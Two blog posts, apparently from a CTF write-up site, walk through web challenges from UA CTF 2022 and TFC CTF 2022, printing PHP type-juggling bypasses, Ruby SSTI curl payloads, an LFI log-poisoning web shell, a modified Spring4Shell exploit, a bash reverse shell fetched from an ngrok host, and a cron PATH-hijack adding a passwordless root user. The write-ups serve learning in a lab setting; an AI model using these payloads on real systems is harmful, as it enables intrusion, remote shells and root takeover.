[{"content":"Played UA CTF 2022 with my team CyberSpace. I only played Web and solved 2 Web challenges (2/3).\nTrial by PHP I can get the hidden endpoint, /secret-source.php, from the /robots.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;body\u0026gt; \u0026lt;?php $egg = (hash_hmac(\u0026#34;md5\u0026#34;, $_COOKIE[\u0026#34;egg\u0026#34;], \u0026#34;DEADLYDRAGON\u0026#34;) == 0); $deep = isset($_GET[\u0026#34;deep\u0026#34;]) \u0026amp;\u0026amp; (strlen(base64_encode(abs($_GET[\u0026#34;deep\u0026#34;]))) \u0026lt; strlen($_GET[\u0026#34;deep\u0026#34;])); $hedge = isset($_GET[\u0026#34;THROUGH_A_TRAP_LADEN_MAZE\u0026#34;]) \u0026amp;\u0026amp; (strpos(urldecode($_SERVER[\u0026#39;QUERYSTRING\u0026#39;]), \u0026#34;\u0026#34;) === false); ?\u0026gt; \u0026lt;main\u0026gt; \u0026lt;h1\u0026gt;Trial by PHP\u0026lt;/h1\u0026gt; \u0026lt;i\u0026gt;Complete 3 impossible tasks to prove that you\u0026#39;re a real PHP wizard, Harry.\u0026lt;/i\u0026gt; \u0026lt;ol\u0026gt; \u0026lt;li class=\u0026#34;\u0026lt;?php echo $egg ? \u0026#39;success\u0026#39; : \u0026#39;fail\u0026#39;; ?\u0026gt;\u0026#34;\u0026gt;Produce a hash that\u0026#39;s unusually small.\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;\u0026lt;?php echo $deep ? \u0026#39;success\u0026#39; : \u0026#39;fail\u0026#39;; ?\u0026gt;\u0026#34;\u0026gt;Provide an input that gets shorter with encoding.\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;\u0026lt;?php echo $hedge ? \u0026#39;success\u0026#39; : \u0026#39;fail\u0026#39;; ?\u0026gt;\u0026#34;\u0026gt;Recite the passphrase, without speaking the character who shall not be named.\u0026lt;/li\u0026gt; \u0026lt;/ol\u0026gt; \u0026lt;p id=\u0026#34;flag\u0026#34;\u0026gt;\u0026lt;?php if ($egg \u0026amp;\u0026amp; $deep \u0026amp;\u0026amp; $hedge) { include(\u0026#34;flag.inc.php\u0026#34;); echo $FLAG; } ?\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/main\u0026gt; \u0026lt;/body\u0026gt; To get the flag, we have to bypass these PHP filters\n1 2 3 4 5 \u0026lt;?php $egg = (hash_hmac(\u0026#34;md5\u0026#34;, $_COOKIE[\u0026#34;egg\u0026#34;], \u0026#34;DEADLYDRAGON\u0026#34;) == 0); $deep = isset($_GET[\u0026#34;deep\u0026#34;]) \u0026amp;\u0026amp; (strlen(base64_encode(abs($_GET[\u0026#34;deep\u0026#34;]))) \u0026lt; strlen($_GET[\u0026#34;deep\u0026#34;])); $hedge = isset($_GET[\u0026#34;THROUGH_A_TRAP_LADEN_MAZE\u0026#34;]) \u0026amp;\u0026amp; (strpos(urldecode($_SERVER[\u0026#39;QUERYSTRING\u0026#39;]), \u0026#34;\u0026#34;) === false); ?\u0026gt; The first filter can be bypassed by adding the following cookie. If we pass array, php will generate a Warning and return a NULL and $egg will be 1 as NULL == 0.\n1 Cookie: egg=[] The second filter can be bypassed just like this.\n1 /?deep=0e324324 The last filter can be bypassed by replacing _ with .. PHP replaces dots with underscoreds for $_GET, $_POST, $_COOKIE.\n1 /?THROUGH.A.TRAP.LADEN.MAZE= Juggler From the source, admin.php, we need to bypass 3 checks to get the flag:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;?php include_once(\u0026#39;flag.inc.php\u0026#39;); echo \u0026#34;\u0026lt;p\u0026gt;Challenge nonce: {$nonce}\u0026lt;/p\u0026gt;\u0026#34;; if (!empty($_POST[\u0026#39;username\u0026#39;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#39;password\u0026#39;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#39;hmac\u0026#39;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#39;nonce\u0026#39;])) { $secret = hash_hmac(\u0026#39;sha256\u0026#39;, $_POST[\u0026#39;nonce\u0026#39;], $secret); $hmac = hash_hmac(\u0026#39;sha256\u0026#39;, $_POST[\u0026#39;username\u0026#39;], $secret); if (strcmp($_POST[\u0026#39;username\u0026#39;], \u0026#34;admin\u0026#34;) == 0 \u0026amp;\u0026amp; strcmp($_POST[\u0026#39;password\u0026#39;], $password) == 0 \u0026amp;\u0026amp; $_POST[\u0026#39;hmac\u0026#39;] === $hmac) echo \u0026#34;\u0026lt;p style=\u0026#39;color:green\u0026#39;\u0026gt;Login successful! Here is your flag: {$flag}\u0026lt;/p\u0026gt;\u0026#34;; else echo \u0026#34;\u0026lt;p style=\u0026#39;color:red\u0026#39;\u0026gt;Your credentials are incorrect, please try again!\u0026lt;/p\u0026gt;\u0026#34;; } elseif ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;POST\u0026#39;) { echo \u0026#34;\u0026lt;p style=\u0026#39;color:red\u0026#39;\u0026gt;Please enter your credentials and try again!\u0026lt;/p\u0026gt;\u0026#34;; } ?\u0026gt; username should be admin\n1 2 # strcmp($_POST[\u0026#39;username\u0026#39;], \u0026#34;admin\u0026#34;) == 0 username=admin If we pass array to $_POST['password'], strcmp will always return NULL and NULL == 0\n1 2 # strcmp($_POST[\u0026#39;password\u0026#39;], $password) == 0 password[] If we pass array to $_POST['nonce], $secret will be always NULL and we can calculate $hmac.\n1 2 3 # $secret = hash_hmac(\u0026#39;sha256\u0026#39;, $_POST[\u0026#39;nonce\u0026#39;], $secret); # $hmac = hash_hmac(\u0026#39;sha256\u0026#39;, $_POST[\u0026#39;username\u0026#39;], $secret); # $_POST[\u0026#39;hmac\u0026#39;] === $hmac $hmac should be 8d5f8aeeb64e3ce20b537d04c486407eaf489646617cfcf493e76f5b794fa080\n1 2 echo hash_hmac(\u0026#39;sha256\u0026#39;, \u0026#34;admin\u0026#34;, NULL); // 8d5f8aeeb64e3ce20b537d04c486407eaf489646617cfcf493e76f5b794fa080 Final payload\n1 username=admin\u0026amp;password[]=\u0026amp;hmac=8d5f8aeeb64e3ce20b537d04c486407eaf489646617cfcf493e76f5b794fa080\u0026amp;nonce[]= ","date":"2022-08-02T00:00:00Z","image":"https://g0tfl4g.github.io/p/ua-ctf-2022/img/ua_hu54a0de003f38ed55f50efccd9145a2a2_302091_120x120_fill_box_smart1_3.png","permalink":"https://g0tfl4g.github.io/p/ua-ctf-2022/","title":"UA CTF 2022"},{"content":"Played TFC CTF 2022 with my team CyberSpace. I only played Web and solved all Web challenges (8/8).\nROBOTS AND MUSIC Web | WarmUp\nFrom the robots.txt, I can get the hidden endpoint /g00d_old_mus1c.php.\nPONG Web | WarmUp\nThis challenge is about OS Command Injection.\nUsing |, I can inject the commands as shown below and get the flag.\nARE YOU THE ADMIN? Web | Easy\nFor this challenge, they provided the source files, index.tsx, auth.ts and schema.prisma, but I didn\u0026rsquo;t need them actually.\nI just need to add the extra parameter, isAdmin, in the JSON body when creating the account.\nDEEPLINKS Web | Easy\nThe challenge description gives a hint about iOS app.\nCALENDAR Web | Medium\nFrom the website, I can find out that the application is using a vulnerable version of the modern-event-calendar-lite WordPress plugin.\n1 2 3 4 5 CVE-2021-24146 Lack of authorisation checks in the Modern Events Calendar Lite WP plugin, versions before 5.16.5, did not restrict access to the export files, allowing unauthenticated users to exports all events data in CSV or XML The exploit script can be found here (Wordpress Plugin Modern Events Calendar 5.16.2 - Event export)\nDIAMONDS Web | Medium\nThis challenge is about Ruby Regex Bypassing + SSTI.\nIf we submit characters such as Å (%c5), we can get the debug page and also the part of the source code due to Invalid Byte Sequence in UTF-8.\n1 2 if params[:input] =~ /^[0-9a-z ]+$/i @input = ERB.new(params[:input]).result(binding) It seems like there is no issue in the Regex but in Ruby the ^ and $ match at the start and end of each line. Therefore if any line matches the regex, we can bypass it.\n1 2 3 4 5 6 7 8 9 # Directory Listing # Payload : \u0026lt;%= Dir.entries(\u0026#39;/\u0026#39;) %\u0026gt; curl http://01.linux.challenges.ctf.thefewchosen.com:49768/ -d \u0026#39;input=a %3C%25%3D%20Dir%2Eentries%28%27%2E%2F%27%29%20%25%3E\u0026#39; # Read Flag # Payload : \u0026lt;%= File.open(\u0026#39;flag.txt\u0026#39;).read %\u0026gt; curl http://01.linux.challenges.ctf.thefewchosen.com:49768/ -d \u0026#39;input=a %3C%25%3D%20File.open%28%27flag.txt%27%29.read%20%25%3E\u0026#39; INCLUDE WHAT MATTERS Web | Medium\nTypical LFI challenge.\nTried to read the flag.txt but didn\u0026rsquo;t work. As we already have LFI, we can try RCE via Log Poisoning.\n1 2 3 4 5 6 7 8 GET /?file=/etc/passwd HTTP/1.1 Host: 01.linux.challenges.ctf.thefewchosen.com:49774 User-Agent: User-Agent: \u0026lt;?php system($_GET[\u0026#39;c\u0026#39;]); ?\u0026gt; Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 After poisoning the log file, we just need to check the log file via LFI and execute our commands.\n1 2 GET /?file=/var/log/apache2/access.log\u0026amp;c=ls%20-al%20/ GET /?file=/var/log/apache2/access.log\u0026amp;c=cat%20/hidden_fl4g.txt TUBEINC Web | Hard\nI need to get 2 flags, user.flag and root.flag, to complete this challenge.\nFrom the website footer, we can get the following information.\n1 2 3 4 5 6 \u0026lt;footer\u0026gt; \u0026lt;p\u0026gt;For the complete functionality of the page add the following entries to your DNS configuration and use tube.com:PORT to connect to the platform.\u0026lt;br\u0026gt; 34.65.33.171 tube.com\u0026lt;br\u0026gt; 34.65.33.171 legacy.tube.com\u0026lt;br\u0026gt; DO NOT USE THIS IN PRODUCTION!\u0026lt;/p\u0026gt; \u0026lt;/footer\u0026gt; Just add those 2 lines in the /etc/hosts file and visit the website legacy.tube.com.\n1 2 34.65.33.171 tube.com 34.65.33.171 legacy.tube.com Again from the bottom of the page, I can get the important information.\n1 2 3 4 5 6 7 \u0026lt;!-- Important! Due to the recent discovery of a major vulnerability of the used framework, this platform is now deprecated (more information at /info). It remains available only for backward compatibility reasons. DO NOT USE THIS PLATFORM IN PRODUCTION! --\u0026gt; The /info page tells us that the website is using a compromised \u0026ldquo;Spring-Boot\u0026rdquo; framework. I think this is about Spring4Shell vulnerability.\nGoogle Spring4Shell exploit and just use any exploit you want.\n1 2 git clone https://github.com/Leovalcante/spring4shell python3 spring4shell.py http://legacy.tube.com:52524 Run the script and we can get the user flag from the /home/user.flag\nNow we need to escalate our privileges to root to get the root flag but getting a reverse shell is the trickiest part I guess. I tried multiple methods to get a reverse shell but none of them worked so I had to modify the Spring4Shell exploit to upload the rev.sh file to the server.\n1 2 3 4 5 6 7 def run_exploit(url): directory = \u0026#34;webapps/ROOT\u0026#34; filename = secrets.token_hex(16) post_headers = {\u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;} get_headers = {\u0026#34;prefix\u0026#34;: \u0026#34;\u0026lt;%\u0026#34;, \u0026#34;suffix\u0026#34;: \u0026#34;%\u0026gt;//\u0026#34;, \u0026#34;c\u0026#34;: \u0026#34;Runtime\u0026#34;, \u0026#34;d\u0026#34;: \u0026#34;\u0026lt;\u0026gt;\u0026#34;} log_pattern = (\u0026#34;class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20=%20new%20java.net.URL(request.getParameter(%22url%22)).openStream();%20java.nio.file.Files.copy(in,%20java.nio.file.Paths.get(%22/tmp/rev.sh%22));%20%25%7Bsuffix%7Di%0A\u0026#34;) rev.sh\n1 2 #!/bin/bash bash -i \u0026gt;\u0026amp; /dev/tcp/myip/port 0\u0026gt;\u0026amp;1 Send a request with the url parameter, and get the reverse shell :)\n1 http://legacy.tube.com:52524/3823ccc6aae29902cda00dd7c16dbccf.jsp?url=http://ngrok.site/rev.sh Check all the normal privilege escalation things and we can find that there is a cronjob we can try to exploit.\n/etc/cron.d/update\n1 2 3 SHELL=/bin/sh PATH=/var/tmp:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin * * * * * root apt update \u0026gt;\u0026gt; /var/log/cron.log The PATH includes the global writeable directory /var/tmp. That means we can create our malicious apt file and put it in the /var/tmp direcotry to make the cronjob executes our apt file not the original apt.\napt\n1 2 3 #!/bin/bash # This will add the new root user without password echo \u0026#34;imgroot::0:0:root:/root:/bin/bash” \u0026gt;\u0026gt; /etc/passwd We just need to get the root flag\n1 2 $ su - imgroot # cat /root/root.flag ","date":"2022-08-01T00:00:00Z","image":"https://g0tfl4g.github.io/p/tfc-ctf-2022/img/tfc.svg","permalink":"https://g0tfl4g.github.io/p/tfc-ctf-2022/","title":"TFC CTF 2022"}]